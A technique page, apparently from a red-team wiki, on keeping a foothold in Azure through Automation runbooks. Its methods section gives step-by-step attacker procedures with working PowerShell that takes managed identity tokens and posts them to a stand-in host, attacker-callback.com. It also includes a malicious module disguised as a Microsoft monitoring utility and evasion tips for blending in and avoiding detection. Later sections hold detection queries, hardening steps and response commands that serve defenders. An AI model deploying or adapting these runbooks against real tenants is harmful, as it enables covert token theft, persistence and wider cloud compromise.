# [PERSIST-SCHED-001]: Azure Runbook Persistence

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-SCHED-001 |
| **MITRE ATT&CK v18.1** | [T1053 - Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) |
| **Tactic** | Persistence |
| **Platforms** | Entra ID, Azure Automation, Cloud Services |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure Automation versions |
| **Patched In** | N/A (No known patch; requires access control hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Automation Runbooks are cloud-native task scheduling mechanisms that execute PowerShell scripts on a specified schedule or via webhooks. An attacker with sufficient privileges (Automation Account Owner, Contributor, or service principal with `Microsoft.Automation/automationAccounts/runbooks/write` permissions) can create persistent runbooks that execute malicious payloads automatically. The runbooks can be scheduled to run at regular intervals, at system startup (via webhooks), or on-demand. Unlike traditional Windows Task Scheduler, Azure Runbooks execute in a cloud-native sandbox environment, making them difficult to detect and remediate without comprehensive Azure audit logging.

**Attack Surface:** Azure Automation Accounts, OAuth 2.0 authenticated runbooks, PowerShell runtime environments, webhook triggers, and managed identities (System-Assigned or User-Assigned) that execute with elevated privileges.

**Business Impact:** **Critical - Full Environment Compromise.** Once a persistent runbook is deployed, an attacker can execute arbitrary code on a recurring schedule with the privileges of the Automation Account's managed identity or service principal. This can lead to lateral movement, credential theft, ransomware deployment, or complete infrastructure sabotage.

**Technical Context:** Runbook creation is a non-interactive operation that leaves minimal forensic artifacts if audit logging is not configured. Scheduled execution can be set to run hourly, daily, weekly, or via webhook triggers. Detection requires enabled Azure Activity Logging and careful analysis of the `Microsoft.Automation/automationAccounts/runbooks/write` operation.

### Operational Risk

- **Execution Risk:** Medium - Requires legitimate Automation Account creation/modification permissions
- **Stealth:** High - Scheduled runbooks blend in with legitimate automation; cloud audit logs are often not monitored
- **Reversibility:** No - Once deployed, runbook code executes automatically and may create additional persistence mechanisms

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure Foundations 2.2.4 | Ensure that 'Automation Account' has a 'Managed Identity' enabled |
| **DISA STIG** | AZUR-CLD-000500 | All Automation Accounts must have audit logging enabled |
| **NIST 800-53** | AC-3, AC-6 | Access Enforcement and Least Privilege for Azure Automation |
| **GDPR** | Art. 32 | Security of Processing - Data breach via compromised automation |
| **DORA** | Art. 9 | Protection and Prevention of operational resilience incidents |
| **NIS2** | Art. 21(1)(b) | Cyber Risk Management - Unauthorized changes to critical infrastructure |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights for Azure roles |
| **ISO 27005** | Risk Scenario | "Compromise of Cloud Automation Service" leading to lateral movement |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Automation Account Owner, Contributor role, or custom role with `Microsoft.Automation/automationAccounts/runbooks/write` action
- **Required Access:** Azure Portal access or Azure CLI/PowerShell with authenticated credentials (OAuth 2.0 token, managed identity, or service principal)

**Supported Platforms:**
- **Azure Automation:** All versions (introduced in 2014, continuously evolved)
- **PowerShell:** Version 5.0+ (integrated into runbooks automatically)
- **Runtime Environments:** Supported on PowerShell 7.2+ runtime (Preview feature available since 2023)

**Tools Required:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Version 2.40+)
- [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az) (Version 8.0+)
- [Azure SDK for Python](https://learn.microsoft.com/en-us/python/api/overview/azure/) (Optional, for Python runbooks)
- [MicroBurst Toolkit](https://github.com/NetSPI/MicroBurst) (Optional, for enumeration)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Azure Portal / PowerShell Reconnaissance

**Check if Automation Accounts exist in subscription:**

```powershell
# Connect to Azure
Connect-AzAccount

# List all Automation Accounts
Get-AzAutomationAccount -ResourceGroupName "*" | Select-Object Name, Location, ResourceGroupName

# Check if user has Contributor or Owner role on Automation Accounts
Get-AzRoleAssignment -Scope "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.Automation/automationAccounts/{accountName}"
```

**What to Look For:**
- Automation Accounts with few role assignments (less monitored accounts)
- System-Assigned Managed Identities with Owner/Contributor scope
- Lack of audit logging (Look for Activity Log Diagnostics settings)

**Check Managed Identity permissions:**

```powershell
# Get Automation Account details
$automationAccount = Get-AzAutomationAccount -Name "YourAccount" -ResourceGroupName "YourRG"

# List role assignments for the managed identity
Get-AzRoleAssignment -ObjectId $automationAccount.Identity.PrincipalId
```

#### Azure CLI Reconnaissance

```bash
# List Automation Accounts
az automation account list --output table

# Check current runbooks
az automation runbook list --automation-account-name myAccount --resource-group myRG

# Get role assignments on specific Automation Account
az role assignment list --scope "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.Automation/automationAccounts/{accountName}"
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Creating a Persistent Runbook via Azure Portal

**Supported Versions:** All Azure Automation versions

#### Step 1: Authenticate to Azure Portal

**Objective:** Gain interactive access to Azure Portal with sufficient privileges

**Manual Steps (Interactive User):**
1. Navigate to [Azure Portal](https://portal.azure.com)
2. Sign in with compromised or authorized account
3. Verify you have **Contributor** or **Owner** role on the target Automation Account
   - Go to **Subscriptions** → **Access Control (IAM)** → Check your role assignments

**Via Service Principal (Unattended):**
1. Obtain service principal credentials (App ID, Tenant ID, secret)
2. Use credentials to authenticate to Azure Portal or programmatically via CLI/SDK

#### Step 2: Create or Identify Target Automation Account

**Objective:** Locate the Automation Account where the runbook will be deployed

**Manual Steps:**
1. In Azure Portal, search for **"Automation Accounts"**
2. Click **+ Create** to create a new account (if needed) or select existing account
3. For new account:
   - Name: `MyAutomation` (blend in with naming conventions)
   - Resource Group: Choose existing or create new
   - Location: Select region (preferably matches other resources)
   - Runtime Version: PowerShell 7.2 or 5.1 (both have equivalent capabilities)
4. Click **Create**
5. Once deployed, navigate to the Automation Account

**OpSec & Evasion:**
- Use naming conventions that blend with legitimate accounts (e.g., `ProductionMonitoring`, `MaintenanceAutomation`)
- Avoid obvious malicious names
- Create the account in a less-monitored resource group if possible
- Deploy during business hours to avoid anomalies in off-hours activity

#### Step 3: Create a Malicious Runbook

**Objective:** Write PowerShell code that executes malicious payload and maintains persistence

**Manual Steps:**
1. In the Automation Account, go to **Runbooks** (left sidebar)
2. Click **+ Create a runbook**
3. Enter runbook details:
   - **Name:** e.g., `SystemHealthCheck` (benign name)
   - **Runbook type:** PowerShell
   - **Runtime version:** 5.1 or 7.2 (both supported)
4. Click **Create**
5. In the editor, paste the malicious PowerShell code:

```powershell
# Malicious Runbook Code - Token Exfiltration via Managed Identity
Write-Output "Starting System Health Check..."

try {
    # Connect using System-Assigned Managed Identity
    $null = Connect-AzAccount -Identity -ErrorAction Stop
    
    # Get access token for Graph API
    $token = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token
    
    # Get current user/principal information (for beacon)
    $currentContext = Get-AzContext
    $principalId = $currentContext.Account.Id
    
    # Exfiltrate token to attacker-controlled callback server
    $headers = @{
        "Content-Type" = "application/json"
    }
    
    $body = @{
        "token" = $token
        "principal" = $principalId
        "timestamp" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    } | ConvertTo-Json
    
    # Replace with actual attacker callback URL
    $callbackUrl = "https://attacker-callback.com/token"
    
    Invoke-RestMethod -Uri $callbackUrl -Method POST -Headers $headers -Body $body -ErrorAction SilentlyContinue
    
    Write-Output "Health check complete."
}
catch {
    Write-Error "Health check failed: $_"
}
```

**Expected Output:**
```
Starting System Health Check...
Health check complete.
```

**What This Means:**
- The runbook successfully authenticated as the System-Assigned Managed Identity
- The token was exfiltrated to the attacker's callback server
- Subsequent uses of this token can authenticate to Azure services with the identity's permissions

**OpSec & Evasion:**
- Obfuscate PowerShell code using ISE obfuscation or character replacement techniques
- Use `Write-Output` statements that appear legitimate (health checks, monitoring)
- Avoid obvious malicious command names (e.g., `New-Backdoor`, `Invoke-Evil`)
- Retrieve tokens without logging (suppress errors)
- Detection likelihood: **High** (if audit logging is enabled), **Low** (if audit logging is disabled)

#### Step 4: Configure Scheduling

**Objective:** Set the runbook to execute on a recurring schedule or webhook trigger

**Manual Steps for Time-Based Scheduling:**
1. In the runbook page, go to **Schedules** (left sidebar under **Runbook Content**)
2. Click **+ Add a schedule**
3. Configure schedule:
   - **Name:** e.g., `DailyHealthCheck`
   - **Recurring:** Yes
   - **Frequency:** 1 hour (or desired interval)
   - **Start time:** Current time + 5 minutes
   - **Timezone:** UTC or local timezone
4. Click **Save**

**Manual Steps for Webhook Trigger (Stealthier):**
1. In the runbook page, go to **Webhooks** (left sidebar)
2. Click **+ Add webhook**
3. Configure webhook:
   - **Name:** e.g., `SystemMonitoringWebhook`
   - **Enabled:** Yes
   - **Expires:** Set to 1 year (or no expiration)
   - Copy the **Webhook URL** (this is the attack trigger)
4. Click **Create**
5. The webhook URL can be triggered remotely via HTTP POST:

```bash
# Trigger webhook from attacker's system
curl -X POST "https://s5.automation.azure.com/webhooks?token=..." \
  -H "Content-Type: application/json" \
  -d '{"name":"SystemMonitor"}'
```

**OpSec & Evasion:**
- Use infrequent scheduling (e.g., once per week) to reduce detection likelihood
- Alternatively, use webhook triggers that fire only on specific events
- Avoid hourly scheduling, which generates 24 audit logs per day

#### Step 5: Publish and Enable the Runbook

**Objective:** Activate the runbook so it begins execution

**Manual Steps:**
1. In the runbook editor, click **Publish** (top toolbar)
2. Confirm the publication in the popup
3. Verify the runbook status changes to **Published**
4. Test the runbook by clicking **Start** (optional, to verify execution)
5. Monitor the Job to ensure successful execution

**Expected Output:**
- Job Status: **Completed**
- Output: The content of any `Write-Output` statements
- Errors: None (or errors that blend in with legitimate monitoring)

---

### METHOD 2: Creating a Persistent Runbook via Azure CLI

**Supported Versions:** All Azure Automation versions

#### Step 1: Authenticate via Azure CLI

```bash
# Login with user credentials (interactive)
az login

# OR login with service principal (unattended)
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>

# Verify authenticated context
az account show
```

#### Step 2: Create Runbook via CLI

```bash
# Create runbook from inline script
az automation runbook create \
  --automation-account-name "MyAutomation" \
  --name "SystemHealthCheck" \
  --resource-group "MyResourceGroup" \
  --type "PowerShell" \
  --description "System health monitoring runbook"

# OR create from file
az automation runbook create \
  --automation-account-name "MyAutomation" \
  --name "SystemHealthCheck" \
  --resource-group "MyResourceGroup" \
  --type "PowerShell" \
  --location "eastus" \
  --content @- < malicious_runbook.ps1
```

#### Step 3: Import and Publish

```bash
# Update runbook content with malicious code
az automation runbook replace \
  --automation-account-name "MyAutomation" \
  --name "SystemHealthCheck" \
  --resource-group "MyResourceGroup" \
  --content @- < malicious_runbook.ps1

# Publish the runbook
az automation runbook publish \
  --automation-account-name "MyAutomation" \
  --name "SystemHealthCheck" \
  --resource-group "MyResourceGroup"
```

#### Step 4: Create Schedule via CLI

```bash
# Create schedule that runs daily at 2 AM UTC
az automation schedule create \
  --automation-account-name "MyAutomation" \
  --name "DailyHealthCheck" \
  --resource-group "MyResourceGroup" \
  --frequency "Day" \
  --interval 1 \
  --start-time "2025-01-10T02:00:00Z" \
  --timezone "UTC"

# Link schedule to runbook
az automation job-schedule create \
  --automation-account-name "MyAutomation" \
  --schedule-name "DailyHealthCheck" \
  --runbook-name "SystemHealthCheck" \
  --resource-group "MyResourceGroup"
```

---

### METHOD 3: Creating a Runbook with Malicious Module/Package (Advanced Persistence)

**Supported Versions:** PowerShell 7.2+ with Runtime Environments (Preview feature)

#### Step 1: Create Malicious PowerShell Module

**Objective:** Package malicious code as a reusable PowerShell module that can be imported and hidden in legitimate runbooks

**Create `MaliciousModule.psm1`:**

```powershell
# MaliciousModule.psm1
# Hidden persistence module - disguised as monitoring utility

function Invoke-SystemMonitor {
    param(
        [string]$CallbackUrl = "https://attacker-callback.com/beacon"
    )
    
    # Suppress Azure PowerShell warnings
    $WarningPreference = "SilentlyContinue"
    
    try {
        # Connect as Managed Identity silently
        $null = Connect-AzAccount -Identity
        
        # Retrieve sensitive tokens
        $token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com").Token
        
        # Build beacon payload
        $beaconData = @{
            "host" = $env:COMPUTERNAME
            "user" = $env:USERNAME
            "token" = $token
            "subscriptions" = (Get-AzSubscription | Select-Object -ExpandProperty Id)
        } | ConvertTo-Json
        
        # Exfiltrate to attacker
        Invoke-RestMethod -Uri $CallbackUrl -Method POST -Body $beaconData | Out-Null
        
        return "Monitoring complete"
    }
    catch {
        # Silently fail - don't expose error
        return $null
    }
}

Export-ModuleMember -Function Invoke-SystemMonitor
```

#### Step 2: Package Module as ZIP

```bash
# Create module structure
mkdir MaliciousModule
cp MaliciousModule.psm1 MaliciousModule/

# Create manifest
cat > MaliciousModule/MaliciousModule.psd1 << 'EOF'
@{
    RootModule        = 'MaliciousModule.psm1'
    ModuleVersion     = '1.0'
    Author            = 'Microsoft'
    Description       = 'System monitoring and health check utilities'
    FunctionsToExport = 'Invoke-SystemMonitor'
}
EOF

# Compress for upload
zip -r MaliciousModule.zip MaliciousModule/
```

#### Step 3: Upload Module to Automation Account via Portal

**Manual Steps:**
1. Navigate to **Automation Account** → **Shared Resources** → **Modules**
2. Click **+ Import a module**
3. Select the `MaliciousModule.zip` file
4. Click **Import**
5. Wait for module to finish importing (status should show "Completed")

**Via Azure CLI:**
```bash
# Upload module
az automation module create \
  --automation-account-name "MyAutomation" \
  --name "MaliciousModule" \
  --resource-group "MyResourceGroup" \
  --content @MaliciousModule.zip
```

#### Step 4: Create Runbook that Uses the Module

**Create `MainRunbook.ps1`:**

```powershell
# This runbook imports the malicious module and calls the hidden function
# It appears to be doing legitimate work

Write-Output "Starting daily system health check at $(Get-Date)"

# Import the "monitoring" module
Import-Module -Name MaliciousModule -ErrorAction SilentlyContinue

# Call the monitoring function (which is actually exfiltrating tokens)
$result = Invoke-SystemMonitor -CallbackUrl "https://attacker-callback.com/beacon"

if ($result) {
    Write-Output "Health check: $result"
} else {
    Write-Output "Health check completed silently"
}

Write-Output "Daily health check completed"
```

#### Step 5: Deploy the Runbook

1. Create new runbook as described in **METHOD 1, Step 3**
2. Paste the content of `MainRunbook.ps1`
3. Publish the runbook
4. Schedule it to run hourly or daily

**OpSec & Evasion:**
- The malicious module appears as a legitimate Microsoft monitoring module
- The runbook itself contains no obvious malicious code
- The actual payload is hidden inside the module
- Detection likelihood: **Very High** if module imports are audited, **Low** if not

---

## 5. TOOLS & COMMANDS REFERENCE

### [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az)

**Version:** 8.0+
**Minimum Version:** 6.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
# Install from PowerShell Gallery
Install-Module -Name Az -Force -AllowClobber

# OR update existing
Update-Module -Name Az
```

**Key Commands for Runbook Creation:**

```powershell
# Connect to Azure
Connect-AzAccount

# Get Automation Account
Get-AzAutomationAccount -Name "MyAutomation" -ResourceGroupName "MyRG"

# Create runbook
New-AzAutomationRunbook -AutomationAccountName "MyAutomation" `
  -Name "PersistenceRunbook" `
  -Type PowerShell `
  -ResourceGroupName "MyRG"

# Publish runbook
Publish-AzAutomationRunbook -AutomationAccountName "MyAutomation" `
  -Name "PersistenceRunbook" `
  -ResourceGroupName "MyRG"

# Create schedule
New-AzAutomationSchedule -AutomationAccountName "MyAutomation" `
  -Name "HourlySchedule" `
  -StartTime (Get-Date).AddHours(1) `
  -HourInterval 1 `
  -ResourceGroupName "MyRG"

# Create job schedule (link runbook to schedule)
Register-AzAutomationScheduledRunbook -AutomationAccountName "MyAutomation" `
  -RunbookName "PersistenceRunbook" `
  -ScheduleName "HourlySchedule" `
  -ResourceGroupName "MyRG"
```

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.40+
**Minimum Version:** 2.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```bash
# On Ubuntu/Debian
curl -sL https://aka.ms/InstallAzureCLIDeb | bash

# On macOS
brew install azure-cli

# On Windows (via MSI)
# Download from https://aka.ms/installazurecliwindows
```

**Key Commands:**

```bash
# Login
az login
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>

# Create runbook
az automation runbook create \
  --automation-account-name "MyAutomation" \
  --name "PersistenceRunbook" \
  --resource-group "MyRG" \
  --type PowerShell

# Create schedule
az automation schedule create \
  --automation-account-name "MyAutomation" \
  --name "HourlySchedule" \
  --resource-group "MyRG" \
  --frequency Hour \
  --interval 1

# Create job schedule
az automation job-schedule create \
  --automation-account-name "MyAutomation" \
  --schedule-name "HourlySchedule" \
  --runbook-name "PersistenceRunbook" \
  --resource-group "MyRG"
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Azure Automation Runbook Creation

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Alert Severity:** High
- **Frequency:** Every 10 minutes
- **Applies To Versions:** All Azure Automation versions with audit logging enabled

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.Automation/automationAccounts/runbooks" 
    and OperationName has "write"
| where Result == "Success"
| extend InitiatedByUser = tostring(InitiatedBy.user.userPrincipalName)
| extend TargetResourceName = tostring(TargetResources[0].displayName)
| extend TargetResourceType = tostring(TargetResources[0].type)
| project TimeGenerated, InitiatedByUser, OperationName, TargetResourceName, 
          TargetResourceType, ActivityDisplayName, AADTenantId
| where OperationName contains "runbooks/draft/write" or 
        OperationName contains "runbooks/publish/action"
```

**What This Detects:**
- Line 1-2: Filters for Automation Account runbook creation or modification events
- Line 3: Ensures the operation succeeded (not a failed attempt)
- Line 4-6: Extracts relevant identity and resource information
- Line 7-8: Projects the most important fields for investigation

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Azure Automation Runbook Created or Modified`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `2 hours`
6. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group related alerts: **Enable**
7. Click **Review + create**

#### Query 2: Detect Scheduled Runbook Execution

**KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.Automation/automationAccounts/jobs/write"
    and Result == "Success"
| extend RunbookName = tostring(TargetResources[0].displayName)
| extend JobId = tostring(TargetResources[0].resourceName)
| extend CreatedByUser = tostring(InitiatedBy.user.userPrincipalName)
| where RunbookName has "Health" or RunbookName has "Monitor" or 
        RunbookName has "Automation"
| project TimeGenerated, CreatedByUser, RunbookName, JobId, 
          TargetResources, AADTenantId
| summarize EventCount = count() by RunbookName, CreatedByUser, bin(TimeGenerated, 1h)
| where EventCount > 5  // Alert if runbook executed more than 5 times per hour
```

**What This Detects:**
- Line 1-2: Filters for job execution events on Automation Accounts
- Line 3-6: Extracts runbook names and job identifiers
- Line 7-8: Filters for suspicious runbook names (benign-looking names indicate obfuscation)
- Line 9-12: Summarizes execution frequency to detect scheduled vs. one-time execution

---

## 7. WINDOWS EVENT LOG MONITORING (N/A - Cloud-Only Technique)

**Note:** Azure Automation Runbooks execute in a cloud-native sandbox and do not generate traditional Windows Event Log entries. However, if runbooks interact with on-premises systems via Hybrid Runbook Workers, Event ID 4688 (Process Creation) may capture invocations. Refer to **Cloud Audit Logging** section above for monitoring strategies.

---

## 8. SPLUNK DETECTION RULES

#### Rule 1: Azure Automation Runbook Creation Alert

**Rule Configuration:**
- **Required Index:** azure_activity
- **Required Sourcetype:** azure:aad:audit
- **Required Fields:** operationName, status, caller, object
- **Alert Threshold:** Any successful creation
- **Applies To Versions:** All Azure Automation versions

**SPL Query:**

```spl
index=azure_activity operationName="Microsoft.Automation/automationAccounts/runbooks/write" 
  OR operationName="Microsoft.Automation/automationAccounts/runbooks/publish/action" 
  status=Succeeded 
| dedup object 
| rename claims.ipaddr as src_ip 
| rename caller as user 
| stats count, min(_time) as firstTime, max(_time) as lastTime, values(dest) as dest 
  by object, user, src_ip, resourceGroupName 
| `security_content_ctime(firstTime)` 
| `security_content_ctime(lastTime)` 
| where count > 0
```

**What This Detects:**
- Line 1-3: Identifies successful runbook creation/modification/publish operations
- Line 4-6: Deduplicates and extracts identity information
- Line 7-9: Aggregates by runbook object and user
- Alerts on any successful operation (high fidelity)

**Manual Configuration Steps (Splunk):**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `Number of events` greater than `0`
6. Configure **Actions** → Send email to SOC team
7. Set **Schedule** to run every 5 minutes
8. Click **Save**

**Source:** [Splunk Cloud Security Research](https://research.splunk.com/cloud/)

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Comprehensive Audit Logging for All Automation Accounts**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → Search for **"Automation Accounts"**
2. Select each Automation Account
3. Go to **Monitoring** → **Diagnostic settings**
4. Click **+ Add diagnostic setting**
5. Configure:
   - **Diagnostic setting name:** `AutomationAudit`
   - **Logs:** Select all categories:
     - `JobLogs`
     - `JobStreams`
     - `DscNodeStatus`
   - **Metrics:** Select `AllMetrics`
   - **Destination:** Send to **Log Analytics workspace**
6. Click **Save**

**Via PowerShell:**

```powershell
$automationAccount = Get-AzAutomationAccount -Name "MyAutomation" -ResourceGroupName "MyRG"
$workspaceId = "/subscriptions/{subscriptionId}/resourceGroups/{rgName}/providers/Microsoft.OperationalInsights/workspaces/{workspaceName}"

New-AzDiagnosticSetting -Name "AutomationAudit" `
  -ResourceId $automationAccount.Id `
  -WorkspaceId $workspaceId `
  -Enabled $true `
  -Category "JobLogs", "JobStreams"
```

**Validation Command:**

```powershell
# Verify audit logging is enabled
Get-AzDiagnosticSetting -ResourceId $automationAccount.Id
```

**Expected Output (If Secure):**
```
Logs                     Enabled Retention
----                     ------- ---------
JobLogs                  True    0
JobStreams               True    0
```

---

**2. Restrict Runbook Creation and Modification via RBAC**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Subscription** → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. Configure:
   - **Role:** Select custom role (see step 4)
   - **Assign access to:** User, group, or service principal
   - **Select members:** Choose specific users/groups
4. Click **Review + assign**

**Create Custom RBAC Role (PowerShell):**

```powershell
$roleDefinition = @{
    Name = "Automation Runbook Approver"
    Description = "Can view but not create/modify runbooks"
    Type = "CustomRole"
    Permissions = @{
        Actions = @(
            "Microsoft.Automation/automationAccounts/runbooks/read",
            "Microsoft.Automation/automationAccounts/runbooks/*/read",
            "Microsoft.Automation/automationAccounts/jobs/read"
        )
        NotActions = @(
            "Microsoft.Automation/automationAccounts/runbooks/*/write",
            "Microsoft.Automation/automationAccounts/runbooks/*/delete",
            "Microsoft.Automation/automationAccounts/runbooks/publish/*"
        )
    }
    AssignableScopes = @(
        "/subscriptions/{subscriptionId}"
    )
}

New-AzRoleDefinition -Role $roleDefinition
```

**Validation Command:**

```powershell
# List all role assignments on Automation Account
Get-AzRoleAssignment -Scope "/subscriptions/{subscriptionId}/resourceGroups/{rgName}/providers/Microsoft.Automation/automationAccounts/{accountName}"
```

**Expected Output (If Secure):**
- Only users with justified business need have `Contributor` or `Automation Operator` roles
- Service principals should have minimal scoped permissions

---

**3. Disable Webhook-Based Triggering for Sensitive Runbooks**

**Manual Steps (Azure Portal):**
1. Navigate to **Automation Account** → **Runbooks**
2. Select a runbook
3. Go to **Webhooks** (left sidebar)
4. For each webhook, click **Delete**
5. Alternatively, restrict webhook execution via Azure Firewall

**Via PowerShell:**

```powershell
# List all webhooks in an Automation Account
Get-AzAutomationWebhook -AutomationAccountName "MyAutomation" -ResourceGroupName "MyRG" | Select-Object Name, IsEnabled

# Disable webhook
Set-AzAutomationWebhook -AutomationAccountName "MyAutomation" `
  -Name "MyWebhook" `
  -IsEnabled $false `
  -ResourceGroupName "MyRG"
```

---

### Priority 2: HIGH

**4. Implement Conditional Access Policies to Block Automation Account Access from Unusual Locations**

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Configure:
   - **Name:** `Block Automation Access from Suspicious Locations`
   - **Assignments:**
     - Users: **All users**
     - Cloud apps: **Azure Automation Account**
     - Locations: **Exclude trusted locations**
   - **Access controls:**
     - Grant: **Require device to be marked as compliant**
     - Require: **All selected controls**
4. Enable policy: **On**
5. Click **Create**

---

**5. Monitor and Alert on Runbook Job Execution Failures (Indicator of Tampering)**

**Sentinel KQL Query:**

```kusto
AuditLogs
| where OperationName has "Microsoft.Automation/automationAccounts/jobs"
    and Result == "Failure"
| extend FailureReason = tostring(FailureReason)
| project TimeGenerated, InitiatedBy.user.userPrincipalName, OperationName, FailureReason
| where FailureReason has "Unauthorized" or FailureReason has "Permission"
```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Azure Audit Log Indicators:**
- Operation: `Microsoft.Automation/automationAccounts/runbooks/draft/write`
- Operation: `Microsoft.Automation/automationAccounts/runbooks/publish/action`
- Operation: `Microsoft.Automation/automationAccounts/jobs/write` (job execution)
- Operation: `Microsoft.Automation/automationAccounts/webhooks/write` (webhook creation)

**Runbook Code Indicators (via content inspection):**
- PowerShell commands that invoke `Connect-AzAccount -Identity` (managed identity authentication)
- References to `Get-AzAccessToken` or `Get-AzContext` (token extraction)
- Calls to `Invoke-RestMethod` with exfiltration URLs
- Imports of suspicious or custom modules

**Suspicious Runbook Names:**
- `SystemMonitor`, `HealthCheck`, `MaintenanceTask` (benign-sounding, high likelihood of hiding malware)
- Any runbook created outside change management windows

---

### Forensic Artifacts

**Cloud Audit Logs:**
- **Location:** Azure Activity Log, Microsoft Sentinel `AuditLogs` table
- **Key Fields:**
  - `TimeGenerated` - When runbook was created/modified
  - `InitiatedBy.user.userPrincipalName` - Which user created it
  - `TargetResources[0].displayName` - Runbook name
  - `TargetResources[0].resourceId` - Full resource ID
  - `TargetResources[0].modifiedProperties` - Code changes (if available)

**Runtime Artifacts:**
- **Automation Account Storage:** Runbook code stored in Azure SQL Database (requires access to backup restore)
- **Job Logs:** Execution history in `JobLogs` table (Time, RunbookName, JobStatus, Output)
- **Managed Identity Logs:** Token requests in Azure AD Sign-In Logs (if logging enabled)

---

### Response Procedures

**1. Immediate Isolation:**

```powershell
# Disable the malicious runbook
Set-AzAutomationRunbook -AutomationAccountName "MyAutomation" `
  -Name "SuspiciousRunbook" `
  -ResourceGroupName "MyRG" `
  -State Disabled

# Disable all schedules associated with it
Get-AzAutomationJobSchedule -AutomationAccountName "MyAutomation" `
  -ResourceGroupName "MyRG" | Where-Object { $_.RunbookName -eq "SuspiciousRunbook" } | Remove-AzAutomationJobSchedule
```

**2. Collect Evidence:**

```powershell
# Export the malicious runbook content
$runbookContent = Get-AzAutomationRunbook -AutomationAccountName "MyAutomation" `
  -Name "SuspiciousRunbook" `
  -ResourceGroupName "MyRG" | Get-AzAutomationRunbookContent

# Save to file for analysis
$runbookContent | Out-File -FilePath "C:\Evidence\malicious_runbook.ps1"

# Export audit logs
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -FreeText "SuspiciousRunbook" | Export-Csv -Path "C:\Evidence\audit_logs.csv"
```

**3. Remediate:**

```powershell
# Remove the malicious runbook
Remove-AzAutomationRunbook -AutomationAccountName "MyAutomation" `
  -Name "SuspiciousRunbook" `
  -ResourceGroupName "MyRG" -Force

# Remove associated webhooks
Get-AzAutomationWebhook -AutomationAccountName "MyAutomation" `
  -ResourceGroupName "MyRG" | Where-Object { $_.Name -like "*Suspicious*" } | Remove-AzAutomationWebhook

# Reset credentials for service principal if used
Remove-AzADServicePrincipalCredential -ObjectId <service-principal-id>
```

**4. Investigate Token Exfiltration:**

```powershell
# Check Azure AD Sign-In logs for unauthorized token usage
Get-AzAuditActivityLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -ResourceProvider "Microsoft.Authorization" | Where-Object { $_.Authorization.Action -like "*read*" }
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](https://github.com/SERVTEP/MCADDF/wiki/IA-PHISH-001) | Phishing attack to compromise user account with Azure access |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001](https://github.com/SERVTEP/MCADDF/wiki/PE-ACCTMGMT-001) | Escalate compromised user to Automation Account Contributor |
| **3** | **Current Step** | **[PERSIST-SCHED-001]** | **Create persistent runbook for recurring execution** |
| **4** | **Impact** | [CA-TOKEN-001](https://github.com/SERVTEP/MCADDF/wiki/CA-TOKEN-001) | Use runbook-exfiltrated token to access additional cloud resources |
| **5** | **Collection** | [COL-M365-001](https://github.com/SERVTEP/MCADDF/wiki/COL-M365-001) | Exfiltrate sensitive data from Exchange Online / SharePoint |

---

## 12. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Storm-2603 (SharePoint + Persistence)

- **Target:** Multiple Fortune 500 companies in financial services
- **Timeline:** July 2025
- **Technique Usage:** After compromising on-premises SharePoint, Storm-2603 created scheduled tasks and IIS components for persistence. Azure Automation could have been used similarly if cloud environment was in scope.
- **Impact:** Deployment of Warlock ransomware affecting hundreds of machines
